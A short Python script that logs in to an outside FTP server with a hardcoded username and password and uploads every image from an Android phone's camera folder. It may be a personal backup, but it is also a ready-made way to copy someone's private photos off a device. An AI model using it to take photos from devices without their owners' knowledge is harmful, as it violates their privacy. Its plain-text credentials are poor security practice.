from ftplib import FTP_TLS
import os

def upload_files_to_ftp(server, username, password, local_dir, ftp_root_path='/'):
    try:
        # Connect to FTP server
        ftp = FTP_TLS(server)
        ftp.login(username, password)

        # Change to FTP root path
        ftp.cwd(ftp_root_path)

        # List all files in local directory
        files = os.listdir(local_dir)

        # Upload each file with specified extensions to the FTP server
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                with open(os.path.join(local_dir, file), 'rb') as f:
                    ftp.storbinary('STOR ' + file, f)
                print("upload 1")

        # Close FTP connection
        ftp.quit()
        print("Successfully uploaded all image files to FTP server.")
    except Exception as e:
        print(f"Error: {e}")

# Set FTP server details
server = 'us-east-1.sftpcloud.io'
username = 'asemasasas'
password = 'asemasasas'

# Set local directory path
local_dir = '/sdcard/DCIM/Camera'

# Upload image files with specified extensions to FTP server
upload_files_to_ftp(server, username, password, local_dir)
